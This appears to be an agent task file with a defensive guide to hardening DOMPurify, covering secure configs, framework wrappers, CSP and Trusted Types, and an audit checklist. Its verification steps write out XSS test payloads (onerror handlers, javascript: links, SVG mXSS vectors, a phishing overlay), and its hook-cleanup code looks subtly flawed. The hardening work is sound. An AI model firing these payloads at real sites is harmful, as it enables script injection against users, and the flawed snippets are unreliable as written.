# AGENT TASK: Remediation, Secure Patterns, and Audit Checklist
# PURPOSE: Fix identified vulns, implement secure patterns, verify fixes
# PRIORITY: Run AFTER all testing is complete - fix/harden phase
# INPUTS: All findings from previous chunks, codebase write access
# OUTPUT: Remediation patches, secure wrappers, hardened config, audit completion
# CHAPTERS: 18 (Remediation), 19 (Audit Checklist), 20 (References), Tables 1-5
---

# Chapter 18: Remediation and Secure Integration Patterns

## 18.1 Secure DOMPurify Integration Checklist

### 1. Use Latest Version

**Requirement**: DOMPurify >= 3.4.16 (as of research date, October 2026).

**Rationale**: Each DOMPurify release may fix security vulnerabilities that are not publicly disclosed until after the fix is available. The 3.x branch includes all fixes from 2.x plus architectural improvements (TypeScript rewrite, improved prototype pollution resistance, better namespace tracking).

**Implementation**:
```json
{
  "dependencies": {
    "dompurify": "^3.4.16"
  }
}
```

Configure automated dependency updates:
```yaml
# Dependabot configuration (.github/dependabot.yml)
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    allow:
      - dependency-name: "dompurify"
```

### 2. Use RETURN_DOM_FRAGMENT When Possible

**Requirement**: Use `RETURN_DOM_FRAGMENT: true` to receive a `DocumentFragment` instead of a string.

**Rationale**: Returning a DOM fragment eliminates the serialize-reparse cycle that enables all mXSS attacks (Root Cause 1). The fragment is the actual sanitized DOM tree -- inserting it into the document moves the nodes directly without reparsing.

**Implementation**:
```javascript
const cleanFragment = DOMPurify.sanitize(dirty, { RETURN_DOM_FRAGMENT: true });
targetElement.textContent = ''; // Clear existing content
targetElement.appendChild(cleanFragment);
```

**Caveat**: Not all frameworks support DOM fragment insertion. React's `dangerouslySetInnerHTML` requires a string. Vue's `v-html` requires a string. In these cases, use string output with additional defenses.

### 3. Use USE_PROFILES for Namespace Restriction

**Requirement**: When SVG and MathML are not needed, restrict to HTML namespace only.

**Rationale**: SVG and MathML namespaces are the primary vectors for namespace confusion attacks (Root Cause 2). Eliminating them removes an entire class of bypass vectors.

**Implementation**:
```javascript
const clean = DOMPurify.sanitize(dirty, {
  USE_PROFILES: { html: true }
});
```

### 4. Never Modify Output After Sanitization

**Requirement**: The output of `DOMPurify.sanitize()` must be used as-is.

**Rationale**: Any post-sanitization transformation (decode, replace, concatenate, template substitution) can reintroduce XSS vectors. DOMPurify's safety guarantee applies only to its direct output.

**Anti-patterns to avoid**:
```javascript
// ALL OF THESE ARE VULNERABLE
const clean = DOMPurify.sanitize(dirty);
// Do NOT do any of these:
clean.replace(/&amp;/g, '&');
decodeURIComponent(clean);
clean + unsanitizedContent;
`<div class="${userClass}">${clean}</div>`;
```

### 5. Sanitize at the Last Possible Moment

**Requirement**: Call `DOMPurify.sanitize()` immediately before inserting content into the DOM.

**Rationale**: Sanitizing early and passing the result through application logic increases the risk of post-sanitization modification. Sanitizing at the point of use ensures the output is not transformed before insertion.

**Implementation**:
```javascript
// CORRECT: sanitize at the point of use
element.innerHTML = DOMPurify.sanitize(getUserContent());

// AVOID: sanitize early, use later
const cleanContent = DOMPurify.sanitize(getUserContent());
// ... 50 lines of other code ...
// cleanContent might be modified, concatenated, or cached
element.innerHTML = cleanContent;
```

### 6. Use Trusted Types With CSP

**Requirement**: Deploy Trusted Types CSP header and configure DOMPurify as the sole trusted policy.

**Implementation**:
```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify
```

```javascript
// DOMPurify automatically creates a Trusted Types policy named "dompurify"
// when Trusted Types are enforced
const clean = DOMPurify.sanitize(dirty, { RETURN_TRUSTED_TYPE: true });
// Returns a TrustedHTML object that satisfies the Trusted Types policy
```

### 7. Implement Defense-in-Depth

**Requirement**: Layer DOMPurify with CSP and Trusted Types.

**Rationale**: No single defense is infallible. DOMPurify may have undiscovered bypasses. CSP prevents inline script execution even if an XSS payload passes through. Trusted Types prevent arbitrary string-to-HTML conversion.

**Layered defense**:
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'unsafe-inline';
  object-src 'none';
  base-uri 'self';
  require-trusted-types-for 'script';
  trusted-types dompurify;
```

### 8. Test With Real Browsers

**Requirement**: Test sanitization behavior in real browsers, not just jsdom.

**Rationale**: jsdom does not implement the full HTML parser specification. Critical differences include `<noscript>` parsing (scripting-enabled vs. scripting-disabled), SVG namespace handling, and `<template>` element behavior. A sanitization that is safe under jsdom may be vulnerable in a real browser.

**Implementation**: Use Playwright for browser-matrix testing:
```javascript
const { chromium, firefox, webkit } = require('playwright');

for (const browserType of [chromium, firefox, webkit]) {
  const browser = await browserType.launch();
  const page = await browser.newPage();

  // Test sanitization output in real browser
  const result = await page.evaluate((payload) => {
    const div = document.createElement('div');
    div.innerHTML = DOMPurify.sanitize(payload);
    return div.innerHTML;
  }, testPayload);

  // Verify no script execution
  // ...
}
```

### 9. Keep DOMPurify Updated

**Requirement**: Automated dependency management with security advisory monitoring.

**Tools**:
- Dependabot (GitHub)
- Renovate Bot
- npm audit / yarn audit
- Snyk
- Socket.dev

### 10. Audit Hooks and Wrappers Regularly

**Requirement**: Quarterly review of all DOMPurify hooks and wrapper functions.

**Review scope**:
- Hook logic (no unconditional `forceKeepAttr`, no allowlist mutation)
- Wrapper function paths (no bypass for non-string, no raw input on error)
- Configuration drift (no new permissive options added since last review)

## 18.2 Secure Wrapper Patterns

### Minimal Wrapper Function

```javascript
/**
 * Sanitizes HTML input using DOMPurify with a security-hardened configuration.
 * Returns empty string on any error rather than risking raw input passthrough.
 *
 * @param {unknown} dirty - Input to sanitize (coerced to string)
 * @param {Object} [overrides] - Optional config overrides (validated)
 * @returns {string} Sanitized HTML string
 */
function sanitizeHTML(dirty, overrides = {}) {
  // Always coerce to string -- never return non-string input unsanitized
  const input = String(dirty ?? '');

  try {
    return DOMPurify.sanitize(input, SANITIZE_CONFIG);
  } catch (error) {
    // Log the error for monitoring, but NEVER return raw input
    console.error('[sanitizeHTML] DOMPurify error:', error);
    return '';
  }
}

// NOTE: overrides are intentionally NOT applied here.
// If per-call overrides are needed, use the Configuration Factory below.
```

### Configuration Factory

```javascript
/**
 * Creates frozen DOMPurify configuration objects.
 * Prevents spread-operator override attacks and ensures config immutability.
 */
const DOMPurifyConfigFactory = {
  /**
   * Creates a frozen base configuration.
   * @param {Object} options - Configuration options
   * @returns {Readonly<Object>} Frozen config object
   */
  create(options = {}) {
    // Validate: block dangerous options
    const FORBIDDEN_OPTIONS = [
      'ALLOW_UNKNOWN_PROTOCOLS',
      'WHOLE_DOCUMENT',
    ];

    for (const key of FORBIDDEN_OPTIONS) {
      if (key in options && options[key] === true) {
        throw new Error(`[DOMPurifyConfig] Forbidden option: ${key}`);
      }
    }

    const config = Object.freeze({
      USE_PROFILES: { html: true },
      FORBID_TAGS: ['style', 'form', 'input', 'textarea', 'select', 'button'],
      FORBID_ATTR: ['style', 'onerror', 'onload', 'onclick'],
      ALLOW_DATA_ATTR: false,
      ...options,
      // These ALWAYS override user options (placed after spread)
      ALLOW_UNKNOWN_PROTOCOLS: false,
      SAFE_FOR_XML: true,
    });

    return config;
  },

  /** Standard config for rich-text content */
  richText() {
    return this.create({
      ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'strong', 'em', 'a', 'ul', 'ol', 'li',
                      'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code',
                      'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td'],
      ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'target', 'rel'],
      FORBID_TAGS: [],
      FORBID_ATTR: ['style'],
    });
  },

  /** Minimal config for plain text with basic formatting */
  plainFormatting() {
    return this.create({
      ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'strong', 'em'],
      ALLOWED_ATTR: [],
    });
  },

  /** Config for content that should be text-only (strip all HTML) */
  textOnly() {
    return this.create({
      ALLOWED_TAGS: [],
      ALLOWED_ATTR: [],
      KEEP_CONTENT: true,
    });
  },
};
```

### Hook Registration Management

```javascript
/**
 * Manages DOMPurify hook lifecycle per component.
 * Ensures hooks are cleaned up when the component unmounts.
 */
class DOMPurifyHookManager {
  constructor() {
    this._hooks = new Map();
  }

  /**
   * Registers a hook and tracks it for cleanup.
   * @param {string} hookName - DOMPurify hook name
   * @param {Function} handler - Hook handler function
   * @param {string} componentId - Unique identifier for the registering component
   */
  register(hookName, handler, componentId) {
    const wrappedHandler = (...args) => {
      try {
        return handler(...args);
      } catch (error) {
        console.error(`[DOMPurifyHook] Error in ${hookName} hook for ${componentId}:`, error);
        // Do NOT rethrow -- a failing hook should not crash sanitization
      }
    };

    DOMPurify.addHook(hookName, wrappedHandler);

    if (!this._hooks.has(componentId)) {
      this._hooks.set(componentId, []);
    }
    this._hooks.get(componentId).push({ hookName, handler: wrappedHandler });
  }

  /**
   * Removes all hooks registered by a specific component.
   * Call this on component unmount.
   * @param {string} componentId - The component whose hooks to remove
   */
  cleanup(componentId) {
    const hooks = this._hooks.get(componentId);
    if (!hooks) return;

    for (const { hookName, handler } of hooks) {
      DOMPurify.removeHook(hookName); // Note: removes ALL hooks for this event
      // Re-register hooks from other components
      for (const [otherId, otherHooks] of this._hooks) {
        if (otherId === componentId) continue;
        for (const other of otherHooks) {
          if (other.hookName === hookName) {
            DOMPurify.addHook(hookName, other.handler);
          }
        }
      }
    }

    this._hooks.delete(componentId);
  }

  /** Removes all hooks from all components. */
  cleanupAll() {
    DOMPurify.removeAllHooks();
    this._hooks.clear();
  }
}

const hookManager = new DOMPurifyHookManager();
```

## 18.3 Framework-Specific Secure Patterns

### React: Sanitized Markup Utility

```typescript
import DOMPurify from 'dompurify';
import { useMemo } from 'react';

// Frozen config -- cannot be overridden
const SANITIZE_CONFIG = Object.freeze({
  USE_PROFILES: { html: true },
  FORBID_ATTR: ['style'],
  ALLOW_DATA_ATTR: false,
});

/**
 * Creates a sanitized markup object for React's dangerouslySetInnerHTML.
 * @param dirty - The HTML string to sanitize
 * @returns Object with __html property containing sanitized HTML
 */
export function createSanitizedMarkup(dirty: string): { __html: string } {
  return { __html: DOMPurify.sanitize(String(dirty ?? ''), SANITIZE_CONFIG) };
}

/**
 * React hook that memoizes sanitized HTML.
 * Re-sanitizes only when the input changes.
 * NOTE: This memoization is safe because it re-sanitizes on input change
 * and is component-scoped (not shared across instances).
 */
export function useSanitizedHtml(dirty: string): { __html: string } {
  return useMemo(() => createSanitizedMarkup(dirty), [dirty]);
}

// Usage in component:
function RichContent({ html }: { html: string }) {
  const sanitized = useSanitizedHtml(html);
  return <div dangerouslySetInnerHTML={sanitized} />;
}
```

### Vue: Custom v-sanitized-html Directive

```typescript
import DOMPurify from 'dompurify';
import type { Directive } from 'vue';

const SANITIZE_CONFIG = Object.freeze({
  USE_PROFILES: { html: true },
  FORBID_ATTR: ['style'],
  ALLOW_DATA_ATTR: false,
});

/**
 * Vue directive that sanitizes HTML before inserting into the DOM.
 * Usage: <div v-sanitized-html="userContent"></div>
 */
export const vSanitizedHtml: Directive<HTMLElement, string> = {
  mounted(el, binding) {
    el.innerHTML = DOMPurify.sanitize(String(binding.value ?? ''), SANITIZE_CONFIG);
  },
  updated(el, binding) {
    if (binding.value !== binding.oldValue) {
      el.innerHTML = DOMPurify.sanitize(String(binding.value ?? ''), SANITIZE_CONFIG);
    }
  },
};

// Register globally:
// app.directive('sanitized-html', vSanitizedHtml);

// Usage in template:
// <div v-sanitized-html="userContent"></div>
// Instead of: <div v-html="userContent"></div>
```

### Angular: DOMPurify Pipe

```typescript
import { Pipe, PipeTransform } from '@angular/core';
import DOMPurify from 'dompurify';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

const SANITIZE_CONFIG = Object.freeze({
  USE_PROFILES: { html: true },
  FORBID_ATTR: ['style'],
  ALLOW_DATA_ATTR: false,
});

/**
 * Angular pipe that sanitizes HTML using DOMPurify instead of Angular's DomSanitizer.
 * DOMPurify provides stronger sanitization than Angular's built-in sanitizer.
 *
 * Usage: <div [innerHTML]="userContent | sanitize"></div>
 */
@Pipe({ name: 'sanitize', pure: true })
export class SanitizePipe implements PipeTransform {
  constructor(private domSanitizer: DomSanitizer) {}

  transform(value: string): SafeHtml {
    // First sanitize with DOMPurify (strong sanitization)
    const clean = DOMPurify.sanitize(String(value ?? ''), SANITIZE_CONFIG);
    // Then mark as trusted for Angular (Angular's sanitizer would double-process otherwise)
    return this.domSanitizer.bypassSecurityTrustHtml(clean);
  }
}
```

### Svelte: Sanitization Action

```typescript
import DOMPurify from 'dompurify';

const SANITIZE_CONFIG = Object.freeze({
  USE_PROFILES: { html: true },
  FORBID_ATTR: ['style'],
  ALLOW_DATA_ATTR: false,
});

/**
 * Svelte action that sanitizes inner HTML of an element.
 * Usage: <div use:sanitizedHtml={userContent}></div>
 */
export function sanitizedHtml(node: HTMLElement, html: string) {
  function update(newHtml: string) {
    node.innerHTML = DOMPurify.sanitize(String(newHtml ?? ''), SANITIZE_CONFIG);
  }

  update(html);

  return {
    update,
    destroy() {
      node.innerHTML = '';
    },
  };
}

// For Svelte 5 with {@html}, use a preprocessor or wrapper component:
// <SanitizedHtml content={userContent} />
```

## 18.4 Server-Side Patterns

### Double Sanitization (Server + Client)

```javascript
// Server-side (Node.js with jsdom)
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const serverDOMPurify = createDOMPurify(window);

function serverSanitize(dirty) {
  return serverDOMPurify.sanitize(String(dirty ?? ''), {
    USE_PROFILES: { html: true },
    FORBID_ATTR: ['style'],
    ALLOW_DATA_ATTR: false,
  });
}

// API endpoint
app.post('/api/content', (req, res) => {
  const sanitized = serverSanitize(req.body.content);
  // Store sanitized content
  db.save({ content: sanitized });
  res.json({ content: sanitized });
});

// Client-side (always re-sanitize)
async function loadContent() {
  const response = await fetch('/api/content');
  const data = await response.json();
  // Re-sanitize on client -- server sanitization is not sufficient
  element.innerHTML = DOMPurify.sanitize(data.content, CLIENT_CONFIG);
}
```

### jsdom Awareness

```javascript
// jsdom-specific risks to test for:

// 1. <noscript> parsing differential
const testPayloads = [
  '<noscript><img src=x onerror=alert(1)></noscript>',
  // jsdom (scripting-disabled context) parses content as HTML
  // Browser (scripting-enabled context) treats content as raw text
];

// 2. <template> handling differences
const templatePayloads = [
  '<template><img src=x onerror=alert(1)></template>',
  // jsdom may not fully implement template element content model
];

// 3. SVG namespace handling
const svgPayloads = [
  '<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>',
  // jsdom SVG namespace implementation may differ from browsers
];
```

## 18.5 CSP Configuration

### Strict CSP Headers for DOMPurify-Protected Applications

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{SERVER_GENERATED_NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  require-trusted-types-for 'script';
  trusted-types dompurify;
  report-uri /csp-report;
  report-to csp-endpoint;
```

### Trusted Types Policy Configuration

```javascript
// DOMPurify automatically creates a Trusted Types policy.
// To customize the policy name:
if (window.trustedTypes && window.trustedTypes.createPolicy) {
  // DOMPurify will use this policy name
  DOMPurify.sanitize(dirty, {
    RETURN_TRUSTED_TYPE: true,
    // Policy name defaults to "dompurify"
  });
}

// Verify Trusted Types enforcement:
if (window.trustedTypes) {
  console.log('Trusted Types supported');
  // Test that direct innerHTML assignment fails:
  try {
    document.createElement('div').innerHTML = '<b>test</b>';
    console.warn('Trusted Types not enforced -- CSP header may be missing');
  } catch (e) {
    console.log('Trusted Types enforced');
  }
}
```

## 18.6 Monitoring and Alerting

### CSP Violation Reporting

```javascript
// report-to header configuration
{
  "group": "csp-endpoint",
  "max_age": 86400,
  "endpoints": [
    { "url": "https://csp-report.example.com/report" }
  ]
}

// Server-side report handler
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  const report = req.body['csp-report'];
  logger.warn('CSP Violation', {
    blockedUri: report['blocked-uri'],
    violatedDirective: report['violated-directive'],
    documentUri: report['document-uri'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number'],
  });

  // Alert if the violation indicates a potential XSS bypass
  if (report['violated-directive'].startsWith('script-src')) {
    alerting.critical('Potential XSS bypass detected', report);
  }

  res.status(204).end();
});
```

### Trusted Types Violation Reporting

```javascript
// Listen for Trusted Types violations
if (window.trustedTypes) {
  document.addEventListener('securitypolicyviolation', (event) => {
    if (event.violatedDirective === 'require-trusted-types-for') {
      // A script tried to assign a raw string to an HTML sink
      // without going through the Trusted Types policy
      fetch('/api/security/tt-violation', {
        method: 'POST',
        body: JSON.stringify({
          violationType: 'trusted-types',
          sourceFile: event.sourceFile,
          lineNumber: event.lineNumber,
          blockedURI: event.blockedURI,
          sample: event.sample, // The first 40 chars of the blocked string
        }),
      });
    }
  });
}
```

## 18.7 Migration Guide

### From No Sanitization to DOMPurify

**Step 1**: Audit all HTML sinks
```bash
# Find all innerHTML/outerHTML assignments
grep -rn '\.innerHTML\s*=' src/
grep -rn '\.outerHTML\s*=' src/
grep -rn 'insertAdjacentHTML' src/
grep -rn 'document\.write' src/
grep -rn 'dangerouslySetInnerHTML' src/
grep -rn 'v-html' src/
grep -rn 'bypassSecurityTrustHtml' src/
grep -rn '\{@html' src/
```

**Step 2**: Install DOMPurify
```bash
npm install dompurify@^3.4.16
npm install --save-dev @types/dompurify  # For TypeScript
```

**Step 3**: Create a sanitization wrapper (see Section 18.2)

**Step 4**: Replace each sink with sanitized version, one file at a time, with tests

**Step 5**: Deploy CSP headers in report-only mode first
```
Content-Security-Policy-Report-Only: script-src 'self' 'nonce-{NONCE}'; report-uri /csp-report
```

**Step 6**: Monitor CSP reports, fix violations, then enforce

### From DOMPurify 2.x to 3.x

**Breaking changes in 3.x**:
- TypeScript rewrite: types are now included (remove `@types/dompurify`)
- `SAFE_FOR_JQUERY` removed (no longer relevant; jQuery >= 3.5.0 mitigates this class)
- `SAFE_FOR_TEMPLATES` renamed (check release notes for exact new name)
- `RETURN_DOM_IMPORT` default changed
- New CVE protections: `selectedcontent` forbidden, improved namespace tracking, prototype pollution resistance
- ESM-first distribution: CommonJS `require()` may need configuration adjustment

**Migration steps**:
```bash
npm install dompurify@^3.4.16
npm uninstall @types/dompurify  # Types now included

# Update imports
# Before (2.x):
# const DOMPurify = require('dompurify');
# After (3.x):
# import DOMPurify from 'dompurify';

# Search for removed options
grep -rn 'SAFE_FOR_JQUERY' src/
grep -rn 'SAFE_FOR_TEMPLATES' src/
```

### From String Output to RETURN_DOM_FRAGMENT

```javascript
// Before (string output, vulnerable to mXSS):
element.innerHTML = DOMPurify.sanitize(dirty);

// After (DOM fragment, immune to mXSS):
const fragment = DOMPurify.sanitize(dirty, { RETURN_DOM_FRAGMENT: true });
element.textContent = '';      // Clear existing content
element.appendChild(fragment); // Insert sanitized DOM directly
```

**Framework considerations**:
- React: Cannot use RETURN_DOM_FRAGMENT with `dangerouslySetInnerHTML`. Use a ref-based approach:
  ```typescript
  function SafeHtml({ html }: { html: string }) {
    const ref = useRef<HTMLDivElement>(null);
    useEffect(() => {
      if (ref.current) {
        const fragment = DOMPurify.sanitize(html, { RETURN_DOM_FRAGMENT: true });
        ref.current.textContent = '';
        ref.current.appendChild(fragment);
      }
    }, [html]);
    return <div ref={ref} />;
  }
  ```
- Vue: Cannot use RETURN_DOM_FRAGMENT with `v-html`. Use a custom directive with DOM manipulation.
- Angular: Use `Renderer2` to insert the fragment.

---

# Chapter 19: Prioritized DOMPurify Audit Checklist

## Priority 1 -- Critical (Must Fix)

These items represent conditions that directly enable XSS exploitation. Any one of these, if present, may allow an attacker to execute arbitrary JavaScript in the application context.

### 1.1 DOMPurify Version >= 3.4.13

- [ ] **Check**: `npm ls dompurify` or `require('dompurify/package.json').version`
- **Risk if not met**: Known CVEs remain unpatched. CVE-2024-47875 (CVSS 10.0) allows full XSS bypass via nesting-based mXSS in versions < 2.5.0 and 3.0.0-3.1.2. CVE-2026-47423 (`<selectedcontent>` bypass) affects < 3.4.5.
- **Remediation**: `npm install dompurify@^3.4.16`. Verify no other version exists in the dependency tree (`npm ls dompurify`). Pin version in lockfile.
- **Verification**: Run `node -e "console.log(require('dompurify/package.json').version)"` in the project root.

### 1.2 No ALLOW_UNKNOWN_PROTOCOLS: true

- [ ] **Check**: `grep -rn 'ALLOW_UNKNOWN_PROTOCOLS' src/`
- **Risk if not met**: `javascript:` URIs in `href`, `src`, `action`, `formaction`, `xlink:href` attributes pass through sanitization. One-click XSS via `<a href="javascript:alert(document.cookie)">`.
- **Remediation**: Remove `ALLOW_UNKNOWN_PROTOCOLS: true` from all configurations. If custom protocols are needed, use `ALLOWED_URI_REGEXP` to explicitly allowlist safe protocols.
- **Verification**: Sanitize `<a href="javascript:alert(1)">click</a>` and confirm the `href` is removed or replaced.

### 1.3 No Error Fallback Returning Raw Input

- [ ] **Check**: `grep -rn -A5 'catch.*DOMPurify\|catch.*sanitize' src/`
- **Risk if not met**: If DOMPurify throws (due to malformed input, prototype pollution, or resource exhaustion), the catch block returns unsanitized input directly to an HTML sink.
- **Remediation**: Replace `return input` in catch blocks with `return ''`. Log the error for investigation.
- **Verification**: Force DOMPurify to throw (e.g., pass `null` window to `createDOMPurify()`) and confirm the wrapper returns empty string.

### 1.4 No Post-Sanitization String Modification

- [ ] **Check**: Review all code paths between `DOMPurify.sanitize()` and the HTML sink. Use Semgrep rule `dompurify-post-sanitization-modification`.
- **Risk if not met**: `replace()`, `decodeURIComponent()`, string concatenation, or template substitution can re-encode dangerous characters or reassemble malicious HTML from safe fragments.
- **Remediation**: Move all string transformations to before the `DOMPurify.sanitize()` call. If the output needs to be embedded in a template, sanitize the entire final string.
- **Verification**: Sanitize `<img src=x onerror="alert(1)">`, apply each post-sanitization transformation, insert into innerHTML, and confirm no script execution.

### 1.5 Every innerHTML/outerHTML/insertAdjacentHTML Uses DOMPurify

- [ ] **Check**: Cross-reference all HTML sink locations with DOMPurify.sanitize() calls. Use CodeQL taint analysis query.
- **Risk if not met**: Any HTML sink receiving user-controlled input without sanitization is a direct XSS vulnerability.
- **Remediation**: Wrap each sink's input in `DOMPurify.sanitize()` or use the sanitization wrapper function.
- **Verification**: Use Semgrep rule `dompurify-missing-sanitization-innerhtml` with zero findings.

### 1.6 No Conditional Sanitization Bypass

- [ ] **Check**: Review all sanitization wrapper functions for conditional logic.
- **Risk if not met**: Trust flags (`isTrusted`, `isAdmin`, `isInternal`), role checks, or feature flags that skip sanitization create bypass paths. An attacker who can influence the condition (e.g., setting a cookie, manipulating a query parameter, or exploiting a privilege escalation) bypasses all XSS protection.
- **Remediation**: Remove all conditional bypasses. Sanitization must be unconditional -- every input goes through DOMPurify regardless of source, trust level, or user role.
- **Verification**: Trace all code paths through the sanitization wrapper and confirm DOMPurify.sanitize() is called on every path.

### 1.7 SAFE_FOR_XML Not Set to False

- [ ] **Check**: `grep -rn 'SAFE_FOR_XML.*false' src/`
- **Risk if not met**: Disabling XML safety allows payloads that exploit XML parsing context (XHTML documents, SVG files, SOAP responses). Certain encoding and entity reference attacks become possible.
- **Remediation**: Remove `SAFE_FOR_XML: false` or set to `true`. Only set to `false` if the output is guaranteed to be used in an HTML5 document context and never in XML.
- **Verification**: Sanitize an XHTML-specific payload and confirm dangerous constructs are removed.

## Priority 2 -- High (Should Fix)

These items represent conditions that significantly weaken DOMPurify's protection, making exploitation easier or enabling bypass chains.

### 2.1 RETURN_DOM_FRAGMENT Used Where Possible

- [ ] **Check**: Review all DOMPurify.sanitize() calls. Identify which can switch to DOM fragment output.
- **Risk if not met**: String output mode is vulnerable to mXSS attacks where the browser's reparse of the serialized HTML produces different DOM structure than what DOMPurify sanitized.
- **Remediation**: Where the framework supports DOM insertion (vanilla JS, React with refs, Vue with directives), use `RETURN_DOM_FRAGMENT: true` and `appendChild()` instead of innerHTML assignment.
- **Verification**: Confirm that known mXSS payloads (e.g., CVE-2024-47875 PoC) do not produce script execution when using DOM fragment output.

### 2.2 USE_PROFILES: { html: true } When SVG/MathML Not Needed

- [ ] **Check**: Determine whether SVG or MathML content is required in sanitized output.
- **Risk if not met**: SVG and MathML namespace transitions are the primary vector for namespace confusion attacks, which have produced multiple critical CVEs.
- **Remediation**: Add `USE_PROFILES: { html: true }` to all configurations where SVG and MathML are not needed.
- **Verification**: Confirm that SVG-based mXSS payloads (e.g., `<svg><foreignObject><body><img src=x onerror=alert(1)>`) produce no output.

### 2.3 No Permissive CUSTOM_ELEMENT_HANDLING

- [ ] **Check**: `grep -rn 'CUSTOM_ELEMENT_HANDLING' src/` and review `tagNameCheck` and `attributeNameCheck`.
- **Risk if not met**: `tagNameCheck: /.*/` or `tagNameCheck: () => true` allows ANY element through, including framework script gadgets (`<angular-component>`, `<lit-element>` with event bindings).
- **Remediation**: Use specific regex patterns: `tagNameCheck: /^my-app-/` to match only your application's custom element prefix.
- **Verification**: Attempt to pass `<evil-component onconnected="alert(1)">` and confirm it is removed.

### 2.4 No Caching of Sanitized Output

- [ ] **Check**: Search for Map, WeakMap, localStorage, or sessionStorage usage near DOMPurify calls.
- **Risk if not met**: Cached sanitized output may have been sanitized by an older (vulnerable) DOMPurify version. After upgrading DOMPurify, the cached output is served without re-sanitization.
- **Remediation**: Remove caching. Call DOMPurify.sanitize() at each point of use. If performance is critical, use React useMemo or Vue computed properties (component-scoped, re-evaluated when input changes).
- **Verification**: Confirm no global cache stores DOMPurify output.

### 2.5 No Type-Checking Wrapper Bypass

- [ ] **Check**: Review wrapper functions for `typeof` checks that skip sanitization.
- **Risk if not met**: Passing an object with a malicious `toString()` method, or a TrustedHTML object, bypasses the type check and returns unsanitized content.
- **Remediation**: Always coerce to string: `const input = String(dirty ?? '')` before sanitizing. Never return non-string input unsanitized.
- **Verification**: Pass `{ toString: () => '<img src=x onerror=alert(1)>' }` and confirm sanitization occurs.

### 2.6 Hooks Audited

- [ ] **Check**: List all `addHook` calls and review handler logic.
- **Risk if not met**: Hooks can override sanitization decisions. `forceKeepAttr = true` keeps any attribute. Allowlist mutation in hooks can add dangerous tags/attributes.
- **Remediation**: Review each hook. Ensure `forceKeepAttr` is only set for specific, known-safe attributes. Ensure no hook modifies the internal allowlist sets.
- **Verification**: Test sanitization with hooks active using known XSS payloads.

### 2.7 Server-Side and Client-Side Consistency

- [ ] **Check**: Compare server-side and client-side DOMPurify configurations.
- **Risk if not met**: If the server sanitizes with a more permissive config than the client, server-sanitized content stored in the database may contain payloads that the client does not re-sanitize.
- **Remediation**: Ensure client-side re-sanitization of all server-provided HTML content. Server config should be at least as strict as client config.
- **Verification**: Sanitize test payloads on server and verify client re-sanitization catches anything the server missed.

### 2.8 CSP Deployed With Script-Src Restrictions

- [ ] **Check**: Review CSP headers for `script-src` directive.
- **Risk if not met**: Without CSP, any DOMPurify bypass results in full script execution. CSP with strict `script-src` (nonce-based or hash-based) prevents inline script execution even if an XSS payload passes through DOMPurify.
- **Remediation**: Deploy CSP with `script-src 'self' 'nonce-{random}'`. Avoid `'unsafe-inline'` and `'unsafe-eval'`.
- **Verification**: Inject `<script>alert(1)</script>` into innerHTML (bypassing DOMPurify) and confirm CSP blocks execution.

## Priority 3 -- Medium (Recommended)

These items provide additional layers of defense and best-practice alignment.

### 3.1 Trusted Types Enforced via CSP

- [ ] **Check**: `Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify`
- **Risk if not met**: Without Trusted Types, any code path that bypasses the DOMPurify wrapper can assign raw strings to HTML sinks. Trusted Types enforce that only DOMPurify-produced TrustedHTML objects can be assigned.
- **Remediation**: Add `require-trusted-types-for 'script'; trusted-types dompurify` to CSP header. Use `RETURN_TRUSTED_TYPE: true` in DOMPurify config.
- **Verification**: Attempt `element.innerHTML = '<b>raw</b>'` (without DOMPurify) and confirm a Trusted Types violation.

### 3.2 SANITIZE_NAMED_PROPS Enabled

- [ ] **Check**: Review whether the application reads custom properties from `window` or `document` that could be clobbered.
- **Risk if not met**: DOM clobbering via `id` and `name` attributes can shadow `window` and `document` properties. If application code accesses `window.config` or `document.settings`, an attacker can inject `<img id="config">` to override these.
- **Remediation**: Enable `SANITIZE_NAMED_PROPS: true` to remove `id` and `name` attributes that would clobber document properties.
- **Verification**: Inject `<img id="config">` and confirm the `id` is removed.

### 3.3 Style Attribute in FORBID_ATTR

- [ ] **Check**: Determine whether CSS styling is needed in sanitized output.
- **Risk if not met**: The `style` attribute enables CSS-based attacks: UI redressing (position:fixed overlays for phishing), CSS exfiltration (reading page content via CSS selectors), and in legacy browsers, `expression()` XSS. DOMPurify does NOT sanitize CSS content.
- **Remediation**: Add `style` to `FORBID_ATTR` unless CSS styling is explicitly required. If styling is needed, use CSS classes instead of inline styles.
- **Verification**: Inject `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">Phishing overlay</div>` and confirm the style is removed.

### 3.4 Wrapper Functions Follow Secure Pattern

- [ ] **Check**: Review all DOMPurify wrapper functions against the patterns in Section 18.2.
- **Risk if not met**: Wrapper anti-patterns (spread operator config override, type-check bypass, raw input on error) create bypass paths that are independent of DOMPurify's own security.
- **Remediation**: Refactor wrappers to use frozen configs, always coerce to string, always return empty string on error.
- **Verification**: Test each wrapper with edge cases (null, undefined, objects, arrays, error conditions).

### 3.5 Regular DOMPurify Updates

- [ ] **Check**: Automated dependency update mechanism in place (Dependabot, Renovate, or equivalent).
- **Risk if not met**: New DOMPurify vulnerabilities are regularly discovered. Without automated updates, the application accumulates known vulnerabilities.
- **Remediation**: Configure Dependabot or Renovate for daily DOMPurify update checks. Include DOMPurify in security-critical dependency monitoring.
- **Verification**: Confirm that a DOMPurify update PR was created within the last 30 days (or that the version is current).

